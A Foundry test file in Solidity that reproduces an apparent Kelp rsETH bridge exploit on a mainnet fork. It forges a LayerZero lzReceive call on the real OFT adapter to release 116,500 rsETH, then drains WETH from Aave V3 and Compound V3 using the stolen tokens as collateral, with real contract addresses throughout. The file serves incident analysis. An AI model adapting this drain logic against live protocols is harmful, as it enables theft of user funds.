// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20, IAavePool, IAaveOracle, IComet, IAaveDataProvider, IAToken} from "../src/Interfaces.sol";

/// LayerZero V2 message origin.
struct Origin {
    uint32 srcEid;
    bytes32 sender;
    uint64 nonce;
}

/// The REAL Kelp rsETH OFT Adapter entrypoint that the endpoint calls.
interface IKelpOFTAdapter {
    function lzReceive(
        Origin calldata _origin,
        bytes32 _guid,
        bytes calldata _message,
        address _executor,
        bytes calldata _extraData
    ) external payable;
    function token() external view returns (address);
    function endpoint() external view returns (address);
    function peers(uint32 eid) external view returns (bytes32);
    function decimalConversionRate() external view returns (uint256);
}

/// @notice End-to-end reproduction that drives the REAL Kelp OFT Adapter.
/// Instead of `deal()`-ing rsETH to the attacker, we impersonate the LayerZero
/// V2 Endpoint and call the adapter's real `lzReceive()` with a forged message.
/// The adapter then really `safeTransfer`s rsETH out of its escrow, exactly the
/// on-chain effect of the 1-of-1-DVN compromise. Everything downstream (Aave,
/// Compound) is also real.
///
/// What is still assumed (not modeled): the endpoint's DVN verification. In the
/// real incident that check *passed* because Lazarus had poisoned the single DVN,
/// so standing in for the endpoint is faithful to "verification succeeded".
contract KelpRealForgedReceiveTest is Test {
    // Real mainnet addresses
    address constant OFT_ADAPTER = 0x85d456B2DfF1fd8245387C0BfB64Dfb700e98Ef3; // Kelp rsETH OFT Adapter
    address constant LZ_ENDPOINT = 0x1a44076050125825900e736c501f859c50fE728c; // LayerZero V2 EndpointV2
    address constant rsETH   = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
    address constant WETH    = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant AAVE_POOL   = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant AAVE_ORACLE = 0x54586bE62E3c3580375aE3723C145253060Ca0C2;
    address constant AAVE_DP     = 0x497a1994c46d4f6C864904A9f1fac6328Cb7C8a6;
    address constant WETH_ATOKEN = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;
    address constant RSETH_ATOKEN= 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1;
    address constant COMET_WETH  = 0xA17581A9E3356d9A858b789D68B4d866e593aE94;

    uint32  constant SRC_EID = 30110; // Arbitrum One (a configured peer)
    uint256 constant STOLEN_RSETH   = 116_500 ether;
    uint256 constant COMPOUND_ALLOC = 18_000 ether;

    address attacker = makeAddr("lazarus");

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 24_900_000);
    }

    function test_RealAdapterForgedReceiveAndDrain() public {
        console2.log("==================================================================");
        console2.log(" Kelp rsETH exploit - REAL OFT adapter forged lzReceive + drain");
        console2.log(" Fork block 24,900,000  |  adapter 0x85d4...98Ef3");
        console2.log("==================================================================");

        uint256 escrowBefore = IERC20(rsETH).balanceOf(OFT_ADAPTER);
        console2.log("adapter rsETH escrow (locked) BEFORE = %s rsETH", escrowBefore / 1e18);

        // ---- Step 1: forge the inbound message and impersonate the endpoint ----
        bytes32 peer = IKelpOFTAdapter(OFT_ADAPTER).peers(SRC_EID);
        uint256 convRate = IKelpOFTAdapter(OFT_ADAPTER).decimalConversionRate(); // 1e12
        uint64 amountSD = uint64(STOLEN_RSETH / convRate); // shared-decimal amount

        // OFT message = abi.encodePacked(bytes32 sendTo, uint64 amountSD)
        bytes memory message = abi.encodePacked(bytes32(uint256(uint160(attacker))), amountSD);
        Origin memory origin = Origin({srcEid: SRC_EID, sender: peer, nonce: 1});

        // The endpoint is the only allowed caller of the adapter's lzReceive.
        vm.prank(LZ_ENDPOINT);
        IKelpOFTAdapter(OFT_ADAPTER).lzReceive(origin, bytes32(uint256(0xBADC0DE)), message, address(0), "");

        uint256 escrowAfter = IERC20(rsETH).balanceOf(OFT_ADAPTER);
        console2.log("");
        console2.log("[1] Forged lzReceive() executed on the REAL adapter:");
        console2.log("    src peer (eid 30110)   matched, message accepted");
        console2.log("    attacker rsETH received = %s rsETH", IERC20(rsETH).balanceOf(attacker) / 1e18);
        console2.log("    adapter escrow AFTER    = %s rsETH", escrowAfter / 1e18);
        console2.log("    escrow drained by       = %s rsETH", (escrowBefore - escrowAfter) / 1e18);

        assertEq(IERC20(rsETH).balanceOf(attacker), STOLEN_RSETH, "adapter must release forged amount");
        assertEq(escrowBefore - escrowAfter, STOLEN_RSETH, "escrow must drop by released amount");

        // ---- Steps 2-3: real downstream drain ----
        uint256 ethPrice = IAaveOracle(AAVE_ORACLE).getAssetPrice(WETH);
        uint256 totalWeth;
        totalWeth += _drainAave();
        totalWeth += _drainCompound(COMPOUND_ALLOC);

        uint256 usdOut = (totalWeth * ethPrice) / 1e8;
        console2.log("");
        console2.log("==================================================================");
        console2.log(" TOTAL WETH extracted : %s WETH", totalWeth / 1e18);
        console2.log(" Approx USD value     : $%s", usdOut / 1e18);
        console2.log("==================================================================");
        assertGt(totalWeth, 0);
    }

    function _drainAave() internal returns (uint256 borrowed) {
        (, uint256 supplyCap) = IAaveDataProvider(AAVE_DP).getReserveCaps(rsETH);
        uint256 current = IAToken(RSETH_ATOKEN).totalSupply();
        uint256 headroom = supplyCap * 1e18 > current ? supplyCap * 1e18 - current : 0;
        uint256 rsAmount = (headroom * 99) / 100;

        vm.startPrank(attacker);
        IERC20(rsETH).approve(AAVE_POOL, rsAmount);
        IAavePool(AAVE_POOL).supply(rsETH, rsAmount, attacker, 0);
        uint8 bestCat;
        uint256 bestAvail;
        for (uint8 c = 1; c <= 8; c++) {
            try IAavePool(AAVE_POOL).setUserEMode(c) {
                try IAavePool(AAVE_POOL).setUserUseReserveAsCollateral(rsETH, true) {} catch {}
                (, , uint256 a, , , ) = IAavePool(AAVE_POOL).getUserAccountData(attacker);
                if (a > bestAvail) { bestAvail = a; bestCat = c; }
            } catch {}
        }
        IAavePool(AAVE_POOL).setUserEMode(bestCat);
        try IAavePool(AAVE_POOL).setUserUseReserveAsCollateral(rsETH, true) {} catch {}

        (, , uint256 availUsd, , uint256 ltv, ) = IAavePool(AAVE_POOL).getUserAccountData(attacker);
        uint256 ethPrice = IAaveOracle(AAVE_ORACLE).getAssetPrice(WETH);
        uint256 wantWeth = (availUsd * 1e18 * 99) / (ethPrice * 100);
        uint256 liq = IERC20(WETH).balanceOf(WETH_ATOKEN);
        uint256 amt = wantWeth < (liq * 98) / 100 ? wantWeth : (liq * 98) / 100;
        if (amt > 0) IAavePool(AAVE_POOL).borrow(WETH, amt, 2, 0, attacker);
        borrowed = IERC20(WETH).balanceOf(attacker);
        vm.stopPrank();

        console2.log("");
        console2.log("[2] Aave V3 drain (e-mode %s, LTV %s bps):", bestCat, ltv);
        console2.log("    supplied = %s rsETH", rsAmount / 1e18);
        console2.log("    borrowed = %s WETH", borrowed / 1e18);
    }

    function _drainCompound(uint256 rsWanted) internal returns (uint256 borrowed) {
        IComet.AssetInfo memory info = IComet(COMET_WETH).getAssetInfoByAddress(rsETH);
        (uint128 cur, ) = IComet(COMET_WETH).totalsCollateral(rsETH);
        uint256 headroom = uint256(info.supplyCap) > cur ? uint256(info.supplyCap) - cur : 0;
        uint256 rsAmount = rsWanted < (headroom * 99) / 100 ? rsWanted : (headroom * 99) / 100;

        uint256 before = IERC20(WETH).balanceOf(attacker);
        vm.startPrank(attacker);
        IERC20(rsETH).approve(COMET_WETH, rsAmount);
        IComet(COMET_WETH).supply(rsETH, rsAmount);
        uint256 liq = IERC20(WETH).balanceOf(COMET_WETH);
        uint256 want = (rsAmount * 85) / 100;
        uint256 amt = want < (liq * 98) / 100 ? want : (liq * 98) / 100;
        IComet(COMET_WETH).withdraw(WETH, amt);
        vm.stopPrank();
        borrowed = IERC20(WETH).balanceOf(attacker) - before;

        console2.log("");
        console2.log("[3] Compound V3 drain:");
        console2.log("    supplied = %s rsETH", rsAmount / 1e18);
        console2.log("    borrowed = %s WETH", borrowed / 1e18);
    }
}
